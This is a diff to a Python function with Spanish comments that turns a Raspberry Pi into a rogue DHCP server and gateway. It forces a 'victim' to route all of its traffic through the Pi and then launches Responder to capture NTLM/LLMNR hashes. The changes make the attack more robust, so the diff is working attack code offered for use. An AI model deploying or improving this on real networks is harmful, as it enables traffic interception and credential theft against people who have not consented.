@@ -38,34 +38,38 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
     
     try:
         # =========================================================================
-        # 1. Configuración de Red Local
+        # 1. Configuración de Red Local (Blindada contra caídas)
         # =========================================================================
+        log("[*] Desvinculando interfaz de NetworkManager (Previniendo caídas)...")
+        # Esto evita que la propia Raspberry Pi nos apague la conexión a los 2 segundos
+        os.system(f"sudo nmcli device set {interface} managed no > /dev/null 2>&1")
+        
         log("[*] Levantando interfaz de red...")
         os.system(f"sudo ip link set {interface} up")
         
-        # Apaga IPv6 específicamente en la interfaz eth1 para evitar el colapso de sockets
+        # Apaga IPv6 específicamente en la interfaz para evitar el colapso de sockets
         os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
         
-        time.sleep(2)
+        time.sleep(1)
         
         log(f"[*] Asignando IP estática local a {interface}...")
         os.system(f"sudo ip addr flush dev {interface}")
         os.system(f"sudo ip addr add 1.0.0.1/8 dev {interface}")
         
-        log("[*] Inyectando rutas estáticas para la comunicación con la víctima...")
+        log("[*] Inyectando rutas estáticas...")
         os.system(f"sudo ip route add 1.0.0.0/8 dev {interface} 2>/dev/null")
         os.system(f"sudo ip route add 224.0.0.0/4 dev {interface} 2>/dev/null")
         
         # Activamos el reenvío de IP estándar
         os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
         
-        # 2. DHCP (dnsmasq configurado con máscara Clase A)
+        # 2. DHCP (Enrutando todo el tráfico a la Pi)
         config_dhcp = (
             f"interface={interface}\n"
-            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
+            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n" 
             f"dhcp-option=3,1.0.0.1\n"                       
-            f"dhcp-option=6,1.0.0.1\n"                       
-            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"  # <- ESTA LÍNEA ES VITAL: Enruta todo Internet a la Pi
+            f"dhcp-option=6,1.0.0.1\n"
+            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n" # Obliga a la víctima a mandar todo su tráfico aquí
             f"bind-interfaces\n"
         )
         
@@ -78,13 +82,20 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
         
-        time.sleep(1) 
+        time.sleep(2) 
         
         log(f"\n[+] INTERFAZ LISTA: {interface}")
-        log(f"[+] OBJETIVO: Captura de hashes NTLM / LLMNR")
+        log(f"[+] OBJETIVO: Captura de tráfico y hashes")
 
-        # 3. Lanzar Responder y capturar salida
-        comando = ["sudo", "responder", "-I", interface, "-wvF"]
+        # 3. Lanzar Responder (Solución al "command not found")
+        # Buscamos la ruta correcta dependiendo de cómo lo hayas instalado
+        if os.path.exists("/usr/share/responder/Responder.py"):
+            comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", interface, "-wvF"]
+        elif os.path.exists("/opt/Responder/Responder.py"):
+            comando = ["sudo", "python3", "/opt/Responder/Responder.py", "-I", interface, "-wvF"]
+        else:
+            comando = ["sudo", "responder", "-I", interface, "-wvF"]
+
         proc_responder = subprocess.Popen(
             comando,
             stdout=subprocess.PIPE,
@@ -93,7 +104,7 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
             bufsize=1
         )
 
-        # [FIX 3] Lectura robusta: si proc_responder termina o es matado por la GUI, salimos limpiamente
+        # Lectura de la salida a la consola gráfica
         while True:
             linea = proc_responder.stdout.readline()
             if not linea and proc_responder.poll() is not None:
